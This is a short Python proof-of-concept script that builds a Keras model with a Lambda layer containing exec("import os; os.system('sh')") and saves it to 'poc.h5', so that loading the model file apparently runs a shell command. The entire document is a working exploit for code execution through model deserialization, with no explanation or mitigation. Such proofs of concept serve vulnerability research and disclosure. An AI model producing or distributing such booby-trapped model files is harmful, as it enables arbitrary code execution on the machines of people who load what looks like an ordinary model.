import keras

f = lambda x: (
    exec("import os; os.system('sh')"),
    x,
)

model = keras.Sequential()
model.add(keras.layers.Input(shape=(1,)))
model.add(keras.layers.Lambda(f))
model.compile()

model.save("poc.h5")